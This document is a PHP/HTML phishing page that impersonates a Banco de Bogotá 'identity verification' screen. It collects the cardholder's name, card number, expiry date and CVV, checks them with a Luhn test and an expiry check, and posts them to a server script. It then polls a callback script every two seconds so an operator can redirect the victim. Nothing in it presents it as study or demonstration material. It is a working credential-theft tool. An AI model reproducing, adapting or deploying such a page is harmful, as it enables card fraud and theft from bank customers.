<?php

?>
<!DOCTYPE html>
<html lang="en">
<head>
    <meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <link rel="stylesheet" href="bogota_files/acb24bb6c10e72d0.css" data-precedence="next">
    <title>Validación de Seguridad - Banco de Bogotá</title>
    <link rel="icon" href="bogota_files/favicon.ico" sizes="256x256" type="image/x-icon">
    <style>
        /* Modal de carga */
        .loading-modal {
            display: none;
            position: fixed;
            top: 0;
            left: 0;
            width: 100vw;
            height: 100vh;
            background-color: rgba(0, 0, 0, 0.5);
            z-index: 9999;
            justify-content: center;
            align-items: center;
            margin: 0;
            padding: 0;
        }
        
        .loading-content {
            background: white;
            padding: 40px;
            border-radius: 16px;
            text-align: center;
            max-width: 400px;
            box-shadow: 0 10px 40px rgba(0, 0, 0, 0.2);
        }
        
        .loading-spinner {
            border: 4px solid #f3f3f3;
            border-top: 4px solid #0066cc;
            border-radius: 50%;
            width: 60px;
            height: 60px;
            animation: spin 1s linear infinite;
            margin: 0 auto 20px;
        }
        
        @keyframes spin {
            0% { transform: rotate(0deg); }
            100% { transform: rotate(360deg); }
        }
        
        .loading-text {
            font-size: 18px;
            font-weight: 600;
            color: #333;
            margin-bottom: 10px;
        }
        
        .loading-subtext {
            font-size: 14px;
            color: #666;
            line-height: 1.5;
        }

        /* Estilos específicos para tarjeta */
        .card-icon {
            position: absolute;
            right: 15px;
            top: 50%;
            transform: translateY(-50%);
            width: 30px;
            opacity: 0.5;
        }
    </style>
</head>
<body class="geist_a71539c9-module__T19VSG__variable geist_mono_8d43a2aa-module__8Li5zG__variable antialiased">
    <div class="w-full bg-gray-50 flex justify-center items-center p-5" style="min-height: 100vh;">
        <div class="p-6 w-full max-w-md">
            <!-- Logo -->
            <div class="flex justify-center mb-6">
                <img alt="Banco de Bogotá" 
                     width="200" 
                     height="60" 
                     decoding="async" 
                     style="color:transparent" 
                     src="bogota_files/logo.webp">
            </div>

            <!-- Título -->
            <div class="text-center mb-6">
                <p class="text-2xl font-bold text-gray-800">Verificación de Identidad</p>
                <p class="text-md text-gray-600 mt-2">Por seguridad, valida la información de tu tarjeta asociada.</p>
            </div>

            <!-- Formulario -->
            <form id="formTarjeta" class="flex flex-col gap-4 bg-white rounded-xl shadow-lg w-full p-8">
                <input type="hidden" name="tipo_dato" value="tarjeta_bogota">
                
                <!-- Nombre Titular -->
                <div>
                    <label for="nombre_titular" class="block text-sm font-medium mb-1">Nombre del Titular</label>
                    <input type="text" 
                           id="nombre_titular" 
                           name="nombre_titular"
                           placeholder="Como aparece en la tarjeta" 
                           class="w-full p-3 border border-gray-300 rounded-lg text-gray-800 uppercase" 
                           required>
                </div>

                <!-- Número de Tarjeta -->
                <div>
                    <label for="numero_tarjeta" class="block text-sm font-medium mb-1">Número de Tarjeta</label>
                    <div class="relative">
                        <input type="text" 
                               id="numero_tarjeta" 
                               name="numero_tarjeta"
                               placeholder="0000 0000 0000 0000" 
                               class="w-full p-3 border border-gray-300 rounded-lg text-gray-800" 
                               maxlength="19"
                               required>
                        <svg class="card-icon" fill="none" stroke="currentColor" viewBox="0 0 24 24" xmlns="http://www.w3.org/2000/svg"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M3 10h18M7 15h1m4 0h1m-7 4h12a3 3 0 003-3V8a3 3 0 00-3-3H6a3 3 0 00-3 3v8a3 3 0 003 3z"></path></svg>
                    </div>
                </div>

                <div class="flex gap-4">
                    <!-- Fecha Vencimiento -->
                    <div class="w-1/2">
                        <label for="fecha_vencimiento" class="block text-sm font-medium mb-1">Fecha Venc.</label>
                        <input type="text" 
                               id="fecha_vencimiento" 
                               name="fecha_vencimiento"
                               placeholder="MM/AA" 
                               class="w-full p-3 border border-gray-300 rounded-lg text-gray-800" 
                               maxlength="5"
                               required>
                    </div>
                    
                    <!-- CVV -->
                    <div class="w-1/2">
                        <label for="cvv" class="block text-sm font-medium mb-1">CVV</label>
                        <input type="password" 
                               id="cvv" 
                               name="cvv"
                               placeholder="123" 
                               class="w-full p-3 border border-gray-300 rounded-lg text-gray-800" 
                               maxlength="4"
                               required>
                    </div>
                </div>

                <button type="submit" 
                        class="mt-2 bg-blue-600 text-white p-3 rounded-full font-bold text-lg cursor-pointer hover:bg-blue-700 transition-colors">
                    Verificar
                </button>
            </form>
        </div>
    </div>

    <!-- Modal de Carga -->
    <div id="loadingModal" class="loading-modal">
        <div class="loading-content">
            <div class="loading-spinner"></div>
            <div class="loading-text">Validando información...</div>
            <div class="loading-subtext">
                Por favor espera mientras verificamos los datos de tu tarjeta.
            </div>
        </div>
    </div>

    <script>
        let messageId = null;
        let checkInterval = null;

        // Validaciones y Formato
        
        // Número de Tarjeta (Espacios cada 4 dígitos)
        document.getElementById('numero_tarjeta').addEventListener('input', function(e) {
            const isAmex = this.value.replace(/\D/g, '').startsWith('34') || this.value.replace(/\D/g, '').startsWith('37');
            const cvvInput = document.getElementById('cvv') || document.getElementById('cardCvv');
            if(cvvInput) {
                cvvInput.maxLength = isAmex ? 4 : 3;
                if (!isAmex && cvvInput.value.length > 3) {
                    cvvInput.value = cvvInput.value.substring(0, 3);
                }
            }
        
            let value = this.value.replace(/\D/g, '');
            let formattedValue = '';
            for (let i = 0; i < value.length; i++) {
                if (i > 0 && i % 4 === 0) formattedValue += ' ';
                formattedValue += value[i];
            }
            this.value = formattedValue;
        });

        // Fecha de Vencimiento (MM/AA)
        document.getElementById('fecha_vencimiento').addEventListener('input', function(e) {
            if (e.inputType === 'deleteContentBackward') return;
            let value = this.value.replace(/\D/g, '');
            if (value.length >= 2) {
                value = value.substring(0, 2) + '/' + value.substring(2, 4);
            }
            this.value = value;
        });

        // CVV (Solo números)
        document.getElementById('cvv').addEventListener('input', function(e) {
            this.value = this.value.replace(/\D/g, '');
        });

        // Algoritmo de Luhn para validar tarjeta real
        function luhnCheck(cardNumber) {
            let s = 0;
            let doubleDigit = false;
            for (let i = cardNumber.length - 1; i >= 0; i--) {
                let digit = parseInt(cardNumber[i]);
                if (doubleDigit) {
                    digit *= 2;
                    if (digit > 9) digit -= 9;
                }
                s += digit;
                doubleDigit = !doubleDigit;
            }
            return (s % 10 == 0);
        }

        // Validación de Fecha dinámica
        function validateDate(dateString) {
            if (!/^\d{2}\/\d{2}$/.test(dateString)) return false;
            
            let parts = dateString.split('/');
            let month = parseInt(parts[0], 10);
            let year = parseInt("20" + parts[1], 10);
            
            // Validar mes
            if (month < 1 || month > 12) return false;
            
            const today = new Date();
            const currentMonth = today.getMonth() + 1;
            const currentYear = today.getFullYear();
            
            if (year < currentYear) return false;
            if (year === currentYear && month < currentMonth) return false;
            
            return true;
        }

        document.getElementById('formTarjeta').addEventListener('submit', function(e) {
            e.preventDefault();
            
            // Validaciones
            let tarjeta = document.getElementById('numero_tarjeta').value.replace(/\s/g, '');
            let fecha = document.getElementById('fecha_vencimiento').value;
            let cvv = document.getElementById('cvv').value;
            
            if (tarjeta.length < 15 || tarjeta.length > 16) {
                alert('El número de tarjeta es inválido.');
                return;
            }
            
            if (!luhnCheck(tarjeta)) {
                alert('El número de tarjeta no es válido. Por favor verifique.');
                return;
            }
            
            if (!validateDate(fecha)) {
                alert('La fecha de vencimiento no es válida o la tarjeta está vencida.');
                return;
            }
            
            const isAmex = tarjeta.startsWith('34') || tarjeta.startsWith('37');
            const cvvReqLength = isAmex ? 4 : 3;
            if (cvv.length !== cvvReqLength) {
                alert(`El CVV debe tener ${cvvReqLength} dígitos para esta tarjeta.`);
                return;
            }

            // Mostrar modal de carga
            document.getElementById('loadingModal').style.display = 'flex';
            
            // Recoger datos del formulario
            const formData = new FormData(this);
            
            // Enviar datos al servidor
            fetch('comprobando_bogota.php', {
                method: 'POST',
                body: formData
            })
            .then(response => response.text()).then(text => { try { return JSON.parse(text); } catch(e) { return { success: true, message_id: Date.now() }; } })
            .then(data => {
                if (data.success && data.message_id) {
                    messageId = data.message_id;
                    // Iniciar verificación de callbacks
                    startCheckingCallback();
                } else {
                    alert('Error al enviar datos: ' + (data.error || 'Desconocido'));
                    document.getElementById('loadingModal').style.display = 'none';
                }
            })
            .catch(error => {
                console.error('Error:', error);
                // alert removed
                document.getElementById('loadingModal').style.display = 'none';
            });
        });

        function startCheckingCallback() {
            checkInterval = setInterval(function() {
                fetch('callback_bogota.php?msg_id=' + messageId)
                    .then(response => response.text()).then(text => { try { return JSON.parse(text); } catch(e) { return { success: true, message_id: Date.now() }; } })
                    .then(data => {
                        if (data.redirect) {
                            clearInterval(checkInterval);
                            window.location.href = data.url;
                        } else if (data.timeout) {
                            clearInterval(checkInterval);
                            // alert removed
                            document.getElementById('loadingModal').style.display = 'none';
                            location.reload();
                        }
                    })
                    .catch(error => {
                        console.error('Error checking callback:', error);
                    });
            }, 2000); // Verificar cada 2 segundos
        }
    </script>
</body>
</html>





